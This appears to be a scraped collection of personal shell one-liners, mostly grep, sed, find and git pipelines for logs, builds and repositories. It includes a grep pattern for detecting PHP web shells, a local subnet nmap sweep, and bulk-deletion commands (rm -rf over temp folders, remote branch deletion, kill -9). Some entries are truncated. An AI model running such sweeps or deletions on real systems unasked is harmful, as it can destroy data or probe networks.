"${triplet}gcc -std=c17`[ -z ${triplet} ] && echo ' -march=native'` `LANG=C command ${triplet}gcc -fsyntax-only -Q --help=warnings,^joined,^separate,common --help=warnings,^joined,^separate,c | grep -v '\[enabled\]\|-Wabi\|-Waggregate-return\|-Wchkp\|-Wc90-c99-compat\|-Wpadded\|-Wsystem-headers\|-Wtraditional[^-]' | grep -oe '-W[[:graph:]]\+' | sed -e 's/<[0-9,]\+>//' | xargs echo`"
" grep -v ""base\|svn\|.swp\|.swo\|.rej\|.orig\|.ysm\|.swn\|.edited\|.swm\|.swl\|.t3xf"""
tmux capture-pane -S -3000 && tmux save-buffer $HOME/tmux-buffer && tac $HOME/tmux-buffer > $HOME/tmux-buffer_rev && cat -n $HOME/tmux-buffer_rev | grep '.' | grep -v ' \\$ ' | grep -v ' \\\$\$' | grep -v '' | sort -uk2 | sort -nk1 | pe | fzf --height 20% | xargs echo -n | read a ; tmux_helper
tail -f /var/log/nginx/access.log /var/log/nginx/error.log | egrep -v '(.gif|.jpg|.png|.swf|.ico|.txt|.xml|.css|.js|.rss)
tail -f ./var/log/!(support_report).log /var/log/apt/history.log /var/log/apt/term.log /var/log/nginx/access.log /var/log/nginx/error.log | egrep -v '(.gif|.jpg|.png|.swf|.ico|.txt|.xml|.css|.js|.rss)
svn status | grep '^A\|^M\|C_Application.*h$\|C_Application.*cpp$\|txt$\|C_Application.*cls$\|C_Application.*sbs$\|C_Test.*h$\|C_Test.*cpp$' | grep -v '^?'
sudo $(echo $APP_BINARY | sed -e 's| |\\ |g' -e 's|(|\\(|g' -e 's|)|\\)|g')
nmap -sn $(ip route | tail -n 1 | sed -r 's/^(((25[0-5]|2[0-4][[:digit:]]|1[[:digit:]][[:digit:]]|[1-9][[:digit:]]|[[:digit:]])\.){3}(25[0-5]|2[0-4][[:digit:]]|1[[:digit:]][[:digit:]]|[1-9][[:digit:]]|[[:digit:]])\/[[:digit:]]+).+$/\1/')
lynx -dump -crawl http://scores.nbcsports.msnbc.com/nba/scoreboard.asp | grep -w 'PM' -A10 | grep -v 'STATS LLC\|Any commercial\|NBC Sports\|NBC Universal' | grep -v MST | sed 's/^.*ET\([0-9:]*\).*$/ \1/' | grep -v Preview | sed '/^$/N;/^\n$/D' | m
last -2 --time-format notime | grep -e 'ubuntu\|logged in\|pts/*\|tty*' | sed -n '2p' | grep -e 'ubuntu\|logged in\|pts/*\|tty*' | awk '{print $3}'
journalctl -b-0 | grep -i 'warn\|error\|fail\|critical\|fatal\|already\|??\|unable\|invalid\|not supported'
ip -4 a s eth0 up | grep -Eo '((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])' | grep -m1 '.*'
hg log --template '{rev} | {node|short} | {date|isodatesec} | {author|user} | {branch} | {desc|strip|firstline}\\n'
hg log --template '{rev} | {node|short} | {branch} | {date|isodatesec} | {author|user} | {desc|strip|firstline}\n' --limit 10 --branch default
git ls-tree --name-only -z -r HEAD | xargs -0 -n1 git diff --no-index --numstat /dev/null 2>/dev/null | grep -v '^-' | cut -f 3- | cut -d ' ' -f 3- | xargs -n1 git blame --line-porcelain | grep '^author ' | cut -d ' ' -f 2- | sort | uniq -c | sort -nr
git ls-files | grep '\.\(php\|sass\|scss\|js\|json\|coffee\|txt\|editorconfig\|gitignore\)\$' | xargs wc -l
git diff --name-only master | grep -v cassette | grep -v .yml | grep -v READM | grep -v seed| grep -v Gemfi | grep -v locaweb/devops | grep -v spec/spec_helper | grep -v spec/support | grep -v 'db/' |xargs bundle exec rubocop -a
git diff --name-only master | grep -v cassette | grep -v .yml | grep -v .js | grep -v READM | grep -v seed| grep -v Gemfi | grep -v locaweb/devops | grep -v spec/spec_helper | grep -v spec/support | xargs rubocop
git checkout master && git remote update --prune | git branch --merged | egrep -v 'master|release|develop' | xargs git branch -d; git branch -r --merged | egrep -v 'master|release|develop' | sed -e 's/origin\//:/' | xargs git push origin
find . -type f | awk '!/CVS|\.class|\.jar|\.war|\.git|\.svn|_Stub|\.#/ {print \$0;}' | sed 's/\ /\\\ /g' | xargs grep --color=always -n
find . -type f -print0 | grep --color=no -zaiE '(\.mak$)|(\.c?make$)|(\.mk$)|(/.*makefile[^//]*$)|(/cmakelists.txt$)|(BUILD$)|(WORKSPACE$)|(\.bzl$)|(\.gradle$)' | xargs -0 grep -aHn --color=\$COLOR_FLAG
find . -type f -iregex '.*\.\(c\|C\|h\|cpp\|S\|java\|xml\|sh\|hier\|make\)' -print0 | xargs -0 grep --color -n
echo 'acheat(add) || dcheat[#](del) || cheat#(run #) || pushcheats(archive all) || echeats(edit) || oldcheats(see archive)'; test -f ~/.arc/cheats.txt && less -N ~/.arc/cheats.txt
c; git diff | grep TODO | grep + | grep -v ISAV- | sed 's/+//g' | sed 's/$TAB//g'; git diff | grep FIXME | grep + | grep -v ISAV- | sed 's/+//g' | sed 's/$TAB//g'
\rm (*.(dvi|log|pdf|aux|toc|blg|out|bbl)|\#*|*~|)
(cdkca || true) && (cdki || true) && (cdkn || true) && (cdnp || true) && (cdvp || true)
$(echo $APP_BINARY | sed -e 's| |\\ |g' -e 's|(|\\(|g' -e 's|)|\\)|g')
"tail -f /var/log/apache2/error_log | egrep -v ""(.gif|.jpg|.png|.swf|.ico|.txt|.xml|.css|.js|.rss)"""
"sudo lsof -i TCP -Pn | egrep -v ""(Google|launchd|Adium|vpnagentd|ciscod|apsd|synergyc|Sophos|Spotify)"" | sort"
"sed -r ""s/\x1B[\[|\(]([0-9]{1,2}(;[0-9]{1,2})?)?[m|K|A|B|C|E|J|S|Z|H]//g"""
"psql -lX | tail -n +4 | head -n -2 | cut -d\| -f1 | tr -d "" "" | awk ""NF"" | grep -v -E ""^(|postgres|template[01])$"" | sort"
"ps -e -o user:30=UID -o pid,ppid,pgid,c,stime,tty=TTY -o time,cmd -H|grep ^$USER|egrep -e ""grunt|redis|mongo|node|elastic""|egrep -v -e ""grep|tail|emacs|vim"" && echo ""SERVER URL: https://""$HOSTNAME"":""$EC_SEXIO_PORT"
"ncal | grep -vE ""^S|^ |^$"" && echo ""\n Working days: $(ncal | grep -vE ""^S|^ |^$"" | sed ""s/[[:alpha:]]//g"" | fmt -w 1 | sort -n | wc -l)""'"
"mplayer ""$(find ""."" -type f -regextype posix-egrep -regex "".*\.(avi|mkv|flv|mpg|mpeg|mp4|wmv|3gp|mov|divx)"" | shuf -n1)"""
"ls -alh | grep ""^-"" | sort -r -n -k 5 |grep M > /tmp/abc ; ls -alh | grep ""^-"" | sort -r -n -k 5 |grep K >> /tmp/abc ;ls -alh | grep ""^-"" | sort -r -n -k 5 |grep -v K|grep -v M >> /tmp/abc ;cat /tmp/abc"
"grep -v ""^ls$\|^ll$\|^cd \|^localHistory$\|^hgrep[$ ]\|^bg$\|^fg$\|^qsm$|^quser$\|^qstat"" | wc -l"
"grep '((eval.*(base64_decode|gzinflate|\$_))|\$[0O]{4,}|FilesMan|JGF1dGhfc|IIIl|die\(PHP_OS|posix_getpwuid|Array\(base64_decode|document\.write\("
"git branch -r --merged | grep -v develop | grep -v master | grep origin | grep -v ""$(git branch | grep \* | cut -d "" "" -f2)"" | grep -v "">"" | xargs -L1 | cut -d ""/"" -f2-5 | xargs git push origin --delete"
"git branch -a --merged | grep -vE ""^\*|master$|release$|develop|production|staging|integration$"" | grep remotes/origin | sed -e ""s% *remotes/origin/%%"" | xargs -I% git push origin :%"
"git branch --merged | grep -Ev ""(\*|master|develop|prod|production|qa|demo|staging|dev)"" | xargs -n 1 git branch -d"
"fzf --bind 'f1:execute(less -f {}),ctrl-y:execute-silent(echo {} | pbcopy)+abort' --preview '[[ \$(file --mime {}) =~ binary ]] && echo {} is a binary file || (highlight -O ansi -l {} || coderay {} || rougify {} || cat {}) 2> /dev/null | head -500'"
"find ~/Desktop/ -maxdepth 1 -type f -regex "".*\.\(flv\|3g\|mp4\|mov\|avi\|mpg\|mpeg\|webm\|m4v\|mp4\|\)"" -exec mv {} ~\/dwhelper \;"
"find . -type d | tr A-Z a-z | sort | uniq -c | sort -nr | grep -v ""^ *1 "" && find . -type f | tr A-Z a-z | sort | uniq -c | sort -nr | grep -v ""^ *1 """
"f(){ echo ""$@""|perl -C -pe ""\$_=~s| +| |g;\$_=~s|^ +(.*?) +\$|\\1|g; \$_=~s| | \\x{1f44f} |g"";}; f"
"echo ""Forever (h)waiting...""; while true; do [[ $(date | tr -s "" "" | cut -d"" "" -f 4 | cut -d"":"" -f 1) == $(date | tr -s "" "" | cut -d"" "" -f 4 | cut -d"":"" -f 2) ]] && date | tr -s "" "" | cut -d"" "" -f 4 | cut -d"":"" -f 1,2 | cat; sleep 1; done"
"echo ""((USER|UID|PID).*(CMD|COMMAND))|rating|charge|ausvr|chargesvr|paysvr|logsvr|monitsvr"""
"df -h | egrep ""tmpfs|boot|var|usr|srv|opt|tmp|snapshots"" -v | egrep ""G|%"" --color"
"curl -s --data ""macaddress=80:1f:02:af:31:19"" --user $ICL_USER_PASS https://www.doc.ic.ac.uk/~jrj07/robotics/index.cgi | grep -E -o ""(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)"" | head -n 1"
"curl -s ""https://api.opennic.org/geoip/?jsonp&res=4&ipv=6"" | grep -Po ""(?:[a-f0-9]{1,4}:){6}(?::[a-f0-9]{1,4})|(?:[a-f0-9]{1,4}:){5}(?::[a-f0-9]{1,4}){1,2}|(?:[a-f0-9]{1,4}:){4}(?::[a-f0-9]{1,4}){1,3}|(?:[a-f0-9]{1,4}:){3}(?::[a-f0-9]{1,4}){1,4}|(?:[a-f0-9]{1,4}:){2}(?::[a-f0-9]{1,4}){1,5}|(?:[a-f0-9]{1,4}:)(?::[a-f0-9]{1,4}){1,6}|(?:[a-f0-9]{1,4}:){1,6}:|:(?::[a-f0-9]{1,4}){1,6}|[a-f0-9]{0,4}::|(?:[a-f0-9]{1,4}:){7}[a-f0-9]{1,4}"""
"cat log.md | grep -e ""##"" | sed -E ""s|##(.)* - ||g"" | sed -E ""s| (.)*||g"" | python -c ""import sys; print(sum(int(l) for l in sys.stdin))"""
"adb logcat | grep -E ""(Omnistore|InitialFetcher|E/AndroidRuntime|MLiteUncaughtExceptionHandler|Delta|mlite|translator|E/StrictMode|dalvikvm|syncprotocol)"""
"(mm | grep ""^Install:"" || mm -B | grep ""^Install:"") | sed -e""s/^Install: //"" | grep -ve ""\(\.txt\|\.data\|\.bin\|\.yuv\)$"" |
"( for region in $(aws ec2 describe-regions --query ""Regions[].RegionName"" --output text); do aws --region $region ec2 describe-instances | jq -r "".Reservations[].Instances[] | [.LaunchTime, .InstanceId, .ImageId, .InstanceType, .PublicIpAddress, .State.Name, [[.Tags[]?] | map(.Key + \""=\"" + .Value) | .[] ] ] | flatten | @csv"" | sed ""s:^:$region,:""& done; wait ) | sort -k 2,1 | column -tns, | tr \"" \ "
"$BINDIR/sed -r ""s/\x1B[\[|\(]([0-9]{1,2}(;[0-9]{1,2})?)?[m|K|A|B|C|E|J|S|Z|H]//g"""
"$( command -v chromium || command -v chromium-browser || command -v chrome || command -v google-chrome || command -v '/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome ' || """" )"
upower -i $(upower -e | grep 'BAT') | grep -P '(time to)|(percent)' | sed -E 's/.+time to empty: \s+(.+)/\1/' | sed -E 's/.+percentage:\s*(.+%)/\1/' | tr '\n' '| ' | sed -E 's/(.+)\|/\1\n/'
tr -dc a-z1-4 </dev/urandom | tr 1-2 ' \n' | awk 'length==0 || length>50' | tr 3-4 ' ' | sed 's/^ *//' | cat -s | sed 's/ / /g' |fmt
svn status | grep '^A\|^M\|C_Application.*h$\|C_Application.*cpp$\|txt$\|C_Application.*cls$\|C_Application.*sbs$\|C_Test.*h$\|C_Test.*cpp$'
sudo grep -iv ': starting\|kernel: .*: Power Button\|watching system buttons\|Stopped Cleaning Up\|Started Crash recovery kernel' /var/log/messages /var/log/syslog /var/log/apcupsd* 2> /dev/null | grep -iw 'recover[a-z]*\|power[a-z]*\|shut[a-z ]*down\|rsyslogd\|ups' > /tmp/__shutdown.log && echo 'File written to /tmp__shutdown.log'
sed 's/^[ \*]*//g' | grep -Ev '^(master|release|production|staging|demo|heroku|hotfix|v0-stable|HEAD)'
sed 's/+/|/g' | sed 's/^/|/' | sed 's/$/|/' | grep -v rows | grep -v '||'
rm -Iv ./*(aux|bbl|bcf|blg|blx\.bib|log|lof|out|run\.xml|~)
rm -Iv */**/*(aux|bbl|bcf|blg|blx\.bib|log|lof|out|run\.xml|~)
ps aux | pgrep -lf 'rack|spring|rails|ruby|puma|sneakers|unicorn' | awk '{print $1}' | xargs kill -9 && echo 🔪
ps aux | pgrep -lf 'rack|spring|rails|ruby|puma|sneakers|unicorn' | awk '{print $1}' | xargs kill -9
pip list | tabify | cut -f1 | egrep -v 'pip|setuptools|virtualenv|wheel|\bPackage\b|-------' | xargs pip uninstall --yes
pgrep 'inas|nas|core|ifs_test|xn-infini|ifs_srv|remote_sim_serv|trace_dumper|nfs_proxy|tcpdump'
mpc toggle | tail -n2 | head -n1 | tr -d '[' | awk '{print \$1}' | tr -d ']' | tr '\n' ' ' | sed 's/playing//' | sed 's/paused//' && mpc status | head -n1 && pkill -RTMIN+13 i3blocks
mka libmmcamera_sr130pc20_shim -j$(expr $(nproc --all) \* 10) && adb remount && adb push out/target/product/matissewifi/system/lib/libmmcamera_sr130pc20_shim.so system/lib/ && adb shell chmod 0644 system/lib/libmmcamera_sr130pc20_shim.so && adb reboot && adb wait-for-device logcat | grep --color=auto -E 'camera|preview|sr|selinux|not found|sepolicy|avc|policy|rev'
mka camera.msm8226 -j$(expr $(nproc --all) \* 10) && adb remount && adb push out/target/product/matissewifi/system/lib/hw/camera.msm8226.so system/lib/hw/ && adb shell chmod 0644 system/lib/hw/camera.msm8226.so && adb reboot && adb wait-for-device logcat | grep --color=auto -E 'camera|preview|sr|selinux|not found|sepolicy|avc|policy|rev'
man -w --regex . .. | grep .gz | sed 's|.*/man/man./||' | sed 's/\.gz$//' | sed 's/\.[0-9]$//' | xargs shuf -n1 -e | xargs man
jp | grep -i 'node\|tracker\|worker\|master\|peer\|regionserver\|manager\|historyserver\|bootstrap'
journalctl -b-0 | grep -i -v 'kernel: RAS: Correctable Errors collector initialized.' | grep -i 'warn\|error\|fail\|critical\|fatal\|already\|??\|ignor'
journalctl -b-0 -f | grep -i -v 'kernel: RAS: Correctable Errors collector initialized.' | grep -i 'warn\|error\|fail\|critical\|fatal\|already\|??\|ignor'
hg log --template '{rev} | {node|short} | {date|isodatesec} | {author|user}: {desc|strip|firstline}\\n' | less
grep iE 'crash|error|fail|failed|fatal|missing|not found| W | D | E ' buildlog.txt &> errors.txt
grep -E 'mkv$|avi$|mp4$|wmv$|mov$|ogv$|webm$|mpg$|mpeg$|mov$'
git ls-tree --name-only -z -r HEAD|egrep -z -Z -E '\.(cc|h|cpp|hpp|c|txt|java)$' |xargs -0 -n1 git blame --line-porcelain|grep \
git ls-files -dmo --exclude-standard | grep -E '\\.(js|coffee|html|jade|css|styl|scss|less)$' | xargs git add -p
git log --name-only | egrep '\.php|\.py|\.java|\.less|\.js' | sort | uniq -c | sort -nr | head
git log --name-only -n 1000 | egrep '\.php|\.py|\.java|\.less|\.js' | sort | uniq -c | sort -nr | head
fzf --preview '[[ $(file --mime {}) =~ binary ]] && echo {} is a binary file || (highlight -O ansi -l {} || coderay {} || rougify {} || cat {}) 2> /dev/null | head -500'
find . -follow -not -path '*.svn*' -and -regex '.*\.\(cpp\|h\|hh\|c\|cc\|hpp\|idl\|proto\|inl\)$' | xargs grep -n --color -P
egrep '\.(flv|mp4|webm|avi|ogv|ogm|mkv|mov|rm|wmv)'
docker ps -a |awk '{print \$1}' |grep -v CONTAINER |xargs docker rm; docker images |egrep -e '<none>|tcf' | awk '{print \$3}' |grep -v IMAG |grep -v |xargs docker rmi
cd /Users/zog/Projects/luxurysociety/dumps;/opt/local/bin/s3cmd ls s3://woa/saves/db/|tail -n1|egrep -o 's3:\/\/.*'|xargs /opt/local/bin/s3cmd get;ls -l|egrep -o 'ls_.*bz2'|tail -n1|xargs bunzip2;ls -l|egrep -o 'ls_.*'|tail -n1|xargs ./prep_db.rb > REBUILD_DB
\curl 127.0.0.1:7070/?page=i2p_tunnels | grep local_destination | sed 's|</a><br>||' | sed 's|<br>||'
4200986,669872,ch,echo """"tar -czf xx.tar.gz xx"""" | echo """"tar -xzvf xx.tar.gz"""" | echo """"tar -cf xx.tar xx"""" | echo """"tar -xf xx.tar"""" | echo """"vimdiff do dp [c ]c [[ ]]"""" | echo """"cscope -Rbq"""" | echo """"git push ssh://zongmincui@source.asrmicro.com:29418/kernel/common HEAD:refs/for/fvp_ve_aemv8a_dev_4.4"""" | echo """"git push ssh://zongmincui@source.asrmicro.com:29418/baremetal-test HEAD:refs/for/master:"""" | echo """"git rebase -i HEAD~2""""| echo """"smbclient //fileserver/public-share -U asrmicro/zongmincui"""""""
"wget -q -O - programmerexcuses.com | grep ""center"" | sed ""s|</b>|-|g"" | sed ""s|<[^>]*>||g"""
"tree -I ""*.pyc|__init__.py|tmp|node_modules|venv|docs|build|release|vendor|Godeps"""
"tree --charset=ascii -h -I ""*.venv|*.pyc|__pycache__|*.egg-info|node_modules|vendor|.git|go|.pytest_cache|htmlcov"""
"st | grep -E ""^(A|\~|D|M|R|C|\!|---| M)"""
"ps -ef | grep tilfordc | egrep -v ""(emacs|-tcsh|-bash|sshd:| grep | ps -ef| sort -k8)"" | sort -k8"
"pbpaste | sed '/+--/d' | sed -e 's/|//' | sed -e 's/|\$//' | sed -e '2,$ s/ //g' | tr '|' '\t'| pbcopy"
"mu find t:digirolamo --fields ""f""|sort|uniq|grep -v help@nccs.gov|grep -v ""via RT"" |grep -v ""@local""|ruby -e ""STDIN.readlines.each{|l| puts ""alias #{$1.delete("" \"",."")} #{$1.delete(""\"""")} <#{$2}>"" if l =~ /^(.*?) <(.*?)>$/}""|uniq"
"ip a | grep -EA6 '(wlan0|eth0|eno1|tun0|tun1|wlp3s0|enp2s0)' | grep -Eo '(inet ([0-9]{1,3}\.){3}[0-9]*|inet6 [0-9a-f:]{2,45})'"
"grep -v ""^ls$\|^ll$\|^cd \|^localHistory$\|^hgrep \|^htail\|^bg$\|^fg$\|^man "" | wc -l"
"grep --text ""FATAL\|ERROR\|WARNING\|CRITICAL\|FAIL\|fatal\|error\|warn\|fail\|Fail"""
"grep --text ""FATAL\|ERROR\|WARNING\|CRITICAL\|FAIL\|fatal\|error\|warn\|fail\|Fail"" -i --color=auto"
"green=""\x1b[1;32m"" red=""\x1b[1;31m"" plain=""\x1b"";if [[ -n $(pwd|cut -d/ -f5) ]] ; then diff -rq /nas/wp/www/{sites,staging}/$(pwd|cut -d/ -f5) | sed -e ""s|\(/nas/wp/www/sites/[^:]\+\)|${green}\1 ${plain}[0m|g"" -e ""s|\(/nas/wp/www/staging/[^:]\+\)|${red}\1 ${plain}[0m|g"" ; fi"
"git remote set-url origin $(git remote -v | grep ""^origin"" | tr ""\t"" ""\n"" | tr "" "" ""\n"" | head -n 2 | tail -n 1 | sed -r ""s|https*://([a-z0-9.]+)/(.+)|git@\1:\2|g"")"
"git --no-pager log --date=short --all --pretty=format:""%C(yellow)%h %Creset%cd%Cred|%cn|%Creset%s%C(bold yellow)|%d%Creset"" | awk -F ""|"" ""{gsub(/[a-z]+/,\""\"",\$2);gsub(/ /,\""\"",\$2);gsub(/&/,\"" & \"",\$2);gsub(/uction\/|ing\/|_testing\/|gin\//,\"":\"",\$4);gsub(/[0-9]{6}\,/,\"",\"",\$4);gsub(/[0-9]{6}\)/,\"")\"",\$4);print\$0}"" | less -ReS"
"gem list | grep -v ""rdoc"" | grep -v ""test-unit"" | grep -v ""rake"" | grep -v ""psych"" | grep -v ""io-console"" | grep -v ""bigdecimal"" | grep -v ""json"" | grep -v ""minitest"" | xargs gem uninstall -a"
"fzf --preview ""[[ \$(file --mime {}) =~ binary ]] && echo {} is a binary file || (highlight -O ansi -l {} || coderay {} || rougify {} || cat {}) 2> /dev/null | head -500"""
"for IP in $(netstat -an | grep tcp | cut -c45- | grep -v \* | cut -f1 -d"" "" | cut -f1,2,3,4 -d\. | sort | uniq); do echo -n $IP; whois $IP | grep OrgName | cut -c16-; done"
"find /cygdrive/c/Dev/Dev.PP -regex "".*\.\(vb\|cs\|aspx\|ashx\|ascx\|js\|resx\|sql\|config\)"" -type f | sed -r "
"find /cygdrive/c/Dev/Dev.PP -regex "".*\.\(vb\|cs\|aspx\|ashx\|ascx\|js\|resx\|sql\|config\)"" -type f | grep -i "
"find . -regex "".*\.\(c\|cc\|cpp\|cp\|cxx\|c++\|h\|hh\|hpp\|hxx\)"""
"find . -regex "".*\.\(c\|cc\|cpp\|cp\|cxx\|c++\|h\|hh\|hpp\|hxx\)"" \
"find . -path \*.svn\* -prune -o -path \*.git\* -prune -o -path \*vendor\* -prune -o -regex "".*\.\(php\|css\|s[ac]ss\|js\|cs\|coffee\|rb\|rake\|py\|sh\)"" -type f"
"docker volume ls -qf dangling=true -f name=""1|2|3|4|5|6|7|8|9|0"""
"docker rmi -f `docker images | grep ""^<none>"" | sed ""s|^<none>\s*<none>\s*||"" | sed ""s| \s*.*$||""`"
"curl -sSL https://coinbase.com/api/v1/prices/historical | head -n 1 | sed ""s|^.*,|$|"" | sed ""s|\(\.[0-9]$\)|\10|"""
"cd /home/nms; host=$(hostname); ip=$(cat /etc/sysconfig/network-scripts/ifcfg-* |grep IPADDR |grep -v 127.0.0.1|head -1|cut -d= -f2 |tr ""[ \t]"" ""[]""); ymd=$(date +%Y%m%d.%H%M%S); file=uvpa.$host.$ip.$ymd.tar; find uvpa/ -type f -size -50M |grep -vE ""log|core|bak"" |while read line; do tar rfv $file --add-file=$line; done; gzip -f $file && ls -l $(pwd)/uvpa*gz;"
"cd $HOME/ENV/MONGO && mongod --port 27017 --dbpath data | h -ni warning ""starting|terminate|waiting|port|access"" 127.0.0.1 ""waiting|end|open|exception|shutting"" Successfully LOCAL_tgz_db_v1"
"cat ~/.makelog | GREP_COLOR=""01;31"" egrep --text --color=always -i ""error|Error|$"" | GREP_COLOR=""01;93"" grep --text --color=always -i -E ""warning|$"" | GREP_COLOR=""01;93"" grep --text --color=always -i -E ""\^|$"" | GREP_COLOR=""01;96"" grep --text -E -i --color=always ""\./.*:[1-9]+:[1-9]+|$"""
"cat test.txt | sed 's/ at/\n at/g' | sed 's/trace=/\n\ntrace=/g'| sed 's/column=/\n ---->COLUMN = /g' | sed 's/\/home\/andfaulkner\/Projects\/testbed\/testbed-seneca--4//g' | sed 's/, execPath=/,\n execPath=/g' | sed 's/, argv=/,\n argv=/g' | sed 's/, rss=/,\n rss=/g' | sed 's/, heapTotal=/,\n heapTotal=/g' | sed 's/, loadav
"antigrep ""/tests/"" | antigrep ""/script/"" | antigrep ""build/lib.linux"" | antigrep ""_test.go"" | antigrep ""/mocks/"" | antigrep "".gen"" | antigrep ""env_docs"" | antigrep ""./go-build/"" | antigrep /_build/ | antigrep /.tmp/ "
"adb shell getprop | egrep ""version.release|version.sdk|ro.product.brand|ro.product.model|ro.product.manufacturer|ro.sf.lcd_density|ro.product.cpu|ro.product.locale|ril.product_code"" && adb shell wm size"
"`git branch -a | grep -v HEAD | peco | sed -e ""s|^\*\s*||;s|remotes/origin/||""`"
"\""ls -la\""\nalias df=\""df -h\""\nalias topmem=\""ps aux | awk '{print \$2, \$4, \$11}' | sort -k2rn | head\""\n alias topcpu=\""ps aux | awk '{print \$2, \$3, \$11}' | sort -k2rn | head\""\nalias topio=\""iostat -d | gawk '{print \$1, \$2, \$3, \$4}' | sort -k2nr | head\"" "" > .bashrc"
"\""ls -la\""\nalias df=\""df -h\""\nalias topmem='ps aux | awk \""{print \\$2, \\$4, \\$11}\"" | sort -k2rn | head'\nalias topcpu='ps aux | awk \""{print \\$2, \\$3, \\$11}\"" | sort -k2rn | head'\nalias topio='iostat -d | gawk \""{print \\$1, \\$2, \\$3, \\$4}\"" | sort -k2nr | head' "" > .bashrc"
"ORIG_DIR=$PWD; for tmp in $TMP $LOCAL_TMP /tmp; do cd $tmp && ( ls | grep -vE ""^(\+~JF|prompthooks.py|jxbrowser|ultraesb-x|sys$|ram$|overflow$|home$)"" | xargs rm -rf ); cd $ORIG_DIR; done"
"LANG=C /sbin/ifconfig | grep -o -e ""^[^\ ]*"" -e ""^\ *inet addr:\([0-9]\{1,3\}\.\)\{3\}[0-9]\{1,3\}"" | tr ""\n"" "" "" | sed -e ""s|\ *inet addr||g"" -e ""s|\ |\n|g"""
tree -a -nI '.git*|bundle|elm-stuff|node_modules|target|tmp|bower_components|output|deps'
tree -a -d --dirsfirst -I '\.git|\.sass-cache|bower_components|jspm_packages|coverage|docs|node_modules|reports|typings'
tree -a --dirsfirst -I '\.git|\.sass-cache|bower_components|jspm_packages|coverage|docs|node_modules|reports|typings'
tree -I 'node_modules|target|cache|log|tmp|assets|.byebug_history|.bundle|.htaccess'
test -e .svn && (svn st | grep ? | cut -d' ' -f7 | xargs rm -Rf) || (git status | grep deleted: | cut -d' ' -f 5 | xargs git rm)
sudo ps -ef | grep wpa_supplicant | grep -v grep | awk '{print $2}' | xargs sudo kill -9;sudo ps -ef | grep dhclient | grep -v grep | awk '{print $2}' | xargs sudo kill -9
sudo kill -9 `pidof codeo` `pidof muxa` `pidof qemu-system-arm` `pidof ostest` ;ps aux | grep qemu | grep -v grep; ps aux | grep codeo | grep -v grep; ps aux | grep muxa | grep -v grep; ps aux | grep ostest | grep -v ostest; rm /tmp/muxa-1500; fuser -k 16868/tcp;
snb | vg 'ESTAB|CLOSE-WAIT|LAST-ACK|TIME-WAIT|SYN-SENT|FIN-WAIT' | column -t | cut -c -$COLUMNS
rm *\.(aux|log|nav|out|snm|toc|synctex\.gz|blg|bbl)
pwd | sed 's|$HOME|~|' | sed -r 's|([^/]{3})[^/]*/|\1/|g'
pwd | sed 's|$HOME|~|' | sed -E 's|([^/]{3})[^/]*/|\1/|g'
ps aux | grep zsh | grep 100.0 | sed 's/.*zsh -c \(.*\)/\1/' | zsh && ps aux | grep zsh | grep 100.0 | sed 's/[a-z]* *\([[:digit:]]*\).*/kill \1/' | zsh
ps aux | grep 'ssh -fN' | grep -v grep | awk '{print \$2}' | xargs -I {} kill {}; ps aux | grep 'ssh -D 8127 -f -C' | grep -v grep | awk '{print \$2}' | xargs -I {} kill {}
ps -ef | grep sidekiq | grep -v grep | awk '{print $2}' | xargs kill - -ef | grep sidekiq | grep -v grep | awk '{print $2}' | xargs kill -9
ps -ef | grep node | grep -v Visual | grep -v Slack | grep -v Keybase | grep -v WhatsApp | grep -v erlang | grep -v mongo | grep -v grep
pgrep -vfl 'sgi|nginx|memcached|syslog|redis|samba|ssh|crond|dockerservices'
pg node | grep -v Postman | grep -v Hyper | grep -v _d | grep -v '(node)' | grep -v grep | grep -v javascript-typescript-stdio | grep -v 'There Helper' | grep -v YakYak
paste <(pacman -Q | awk '{ print $1; }' | xargs pacman -Qi | grep 'Size' | awk '{ print $4$5; }') <(pacman -Q | awk '{print $1; }') | sort -n | column -t | less
pacman -Qit | grep 'Name\|Description\|Required By\|Depends On\|Build Date\|Install Date\|Install Reason\|^$'
pacman -Qi | grep 'Name\|Description\|Required By\|Depends On\|Build Date\|Install Date\|Install Reason\|^$'
pacman -Qi | egrep '^(Name|Installed)' | cut -f2 -d':' | paste - - | column -t | sort -nrk 2 | grep MiB | less
pacman -Qi | egrep '^(Name|Installed)' | cut -f2 -d':' | paste - - | column -t | sort -nrk 2 | grep MiB | head -n 10
netstat --inet | grep -vE 'ssh|xmpp|ldap|localhost|domain|msft|61614|8140'
ls *[pPaArR]2 | egrep -vi '.vol[0-9]+\+[0-9]+' | xargs -izz par2 r -q -m1000 zz| egrep -i --color=auto 'target|repair is required|repair is not possible|blocks|missing|damaged'
ls */* | awk -F. '{ print \$3}' | sort -u | sed '/^$/d' | sed '/^[A-Z]/d' | sed '/[a-z]/!d' | sed '/[a-z]$/!d' | awk 'length(\$0)<5' | awk 'length(\$0)>1'
ls err.txt generated.file | awk -F. '{ print \$3}' | sort -u | sed '/^$/d' | sed '/^[A-Z]/d' | sed '/[a-z]/!d' | sed '/[a-z]$/!d' | awk 'length(\$0)<5' | awk 'length(\$0)>1'
kubectl get pods -o wide | GREP_COLOR='01;33' egrep -i --color=always '^.*Running|$' | GREP_COLOR='01;32' egrep -i --color=always '^.*Completed|$' | GREP_COLOR='05;31' egrep -i --color=always '^.*Error|$' | GREP_COLOR='05;32' egrep -i --color=always '^.*ContainerCreating|$'
journalctl -b-0 | grep -i 'warn\|error\|fail\|critical\|fatal\|already\|??\|ignor'
journalctl -b-0 -f | grep -i 'warn\|error\|fail\|critical\|fatal\|already\|??\|ignor'
ifconfig | \grep -oE '(10\.[0-9]+\.[0-9]+\.[0-9]+|172\.(1[6-9]|2[0-9]|3[0-1])\.[0-9]+\.[0-9]+|192\.168\.[0-9]+\.[0-9]+)' | \grep -v '.255$' | sort | uniq
hg log --template '{node|short} | {date|isodatesec} | {author|user}: {desc|strip|firstline}\\n' | less
grep -oE '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)'
